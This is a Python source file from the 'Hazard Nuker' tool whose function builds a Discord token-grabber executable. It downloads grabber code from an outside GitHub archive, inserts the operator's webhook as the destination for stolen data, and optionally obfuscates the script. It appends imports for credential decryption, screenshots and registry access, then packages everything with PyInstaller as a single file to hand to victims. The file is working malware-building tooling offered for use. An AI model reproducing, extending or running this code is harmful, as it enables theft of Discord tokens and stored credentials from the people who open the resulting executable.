# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import base64
import os
import random
import shutil

import PyInstaller.__main__
import requests
from colorama import Fore
from Crypto import Random
from Crypto.Cipher import AES

import Hazard
from util.plugins.common import installPackage, setTitle


def TokenGrabberV2(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow'
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/Swxy7w7/Hazard-Archive/main/Hazard-Token-Grabber-V2/main.py").text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
        f.write(code)

    print(f"Do you want to obfuscate {fileName}.exe?")
    yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}y/n: {Fore.RED}')
    if yesno.lower() == "y" or yesno.lower() == "yes":
        print(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Obfuscating code...{Fore.RESET}')

        imports = "\nimport os, re, json, httpx, ntpath, random, winreg, ctypes, shutil, psutil, asyncio, sqlite3, zipfile, threading, subprocess;from sys import argv;from PIL import ImageGrab;from base64 import b64decode;from Crypto.Cipher import AES;from tempfile import mkdtemp, gettempdir;from win32crypt import CryptUnprotectData;from datetime import datetime, timezone, timedelta"
        
        os.system(f"python obfuscation.py {fileName}.py")
        with open(f"{fileName}.py", "a") as f:
            f.write(imports)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
    # PyInstaller.__main__.run([
    #     '%s.py' % fileName,
    #     '--name=%s' % fileName,
    #     '--onefile',
    #     '--clean',
    #     '--noconsole',
    #     '--log-level=INFO',
    #     '--icon=NONE',
    # ])
    os.system(f"pyinstaller --onefile -i NONE --distpath ./ .\{fileName}.py")
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    Hazard.main()
